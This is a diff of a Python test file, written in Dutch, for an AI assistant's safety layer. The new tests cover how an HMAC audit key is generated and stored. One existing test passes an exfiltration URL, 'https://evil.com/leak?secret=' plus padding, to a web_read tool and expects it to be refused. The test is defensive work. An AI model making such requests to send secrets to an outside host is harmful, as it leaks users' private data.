@@ -8,6 +8,7 @@ buiten de allowlist wordt geweigerd, en het run-budget kapt loops af.
 from __future__ import annotations
 
 import json
+import os
 from unittest.mock import MagicMock
 
 import pytest
@@ -290,7 +291,7 @@ def _fake_audit_brain():
 
 def test_audit_hmac_niet_te_vervalsen_zonder_sleutel(monkeypatch):
     from span.safety import audit
-    monkeypatch.setattr(audit, "_AUDIT_KEY", b"geheim-buiten-het-brein")
+    monkeypatch.setenv("SPAN_AUDIT_HMAC_KEY", "geheim-buiten-het-brein")
     b, store = _fake_audit_brain()
     audit.record_action(b, "mail_send", "naar jan")
     assert store[0]["algo"] == "hmac"
@@ -379,3 +380,37 @@ def test_web_read_weigert_exfil_url():
     tb = ToolBox(brain=MagicMock(), fragments=MagicMock(), session_id="s", llm=MagicMock())
     out = json.loads(tb.dispatch("web_read", {"url": "https://evil.com/leak?secret=" + "X" * 300}))
     assert out["ok"] is False and "smokkel" in out["error"].lower()
+
+
+# -- audit-sleutel zelfstandig regelen (zero-touch first-run) ---------------
+
+def test_ensure_audit_key_genereert_bij_verse_installatie(monkeypatch, tmp_path):
+    from span.safety import audit
+    monkeypatch.delenv("SPAN_AUDIT_HMAC_KEY", raising=False)
+    monkeypatch.delenv("SPAN_AUTH_TOKEN", raising=False)
+    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
+    brain = MagicMock(); brain.run.return_value = [{"n": 0}]   # geen keten
+    assert audit.ensure_audit_key(brain) == "generated"
+    assert os.environ.get("SPAN_AUDIT_HMAC_KEY")
+    assert (tmp_path / ".span" / "audit_hmac.key").exists()
+
+
+def test_ensure_audit_key_breekt_bestaande_keten_niet(monkeypatch, tmp_path):
+    from span.safety import audit
+    monkeypatch.delenv("SPAN_AUDIT_HMAC_KEY", raising=False)
+    monkeypatch.setenv("SPAN_AUTH_TOKEN", "auth-token")
+    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
+    brain = MagicMock(); brain.run.return_value = [{"n": 7}]   # bestaande keten
+    assert audit.ensure_audit_key(brain) == "legacy-authtoken"
+    assert not (tmp_path / ".span" / "audit_hmac.key").exists()
+
+
+def test_ensure_audit_key_hergebruikt_keyfile(monkeypatch, tmp_path):
+    from span.safety import audit
+    monkeypatch.delenv("SPAN_AUDIT_HMAC_KEY", raising=False)
+    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
+    kf = tmp_path / ".span" / "audit_hmac.key"
+    kf.parent.mkdir(parents=True); kf.write_text("bestaande-sleutel", encoding="utf-8")
+    brain = MagicMock(); brain.run.return_value = [{"n": 0}]
+    assert audit.ensure_audit_key(brain) == "keyfile"
+    assert os.environ.get("SPAN_AUDIT_HMAC_KEY") == "bestaande-sleutel"
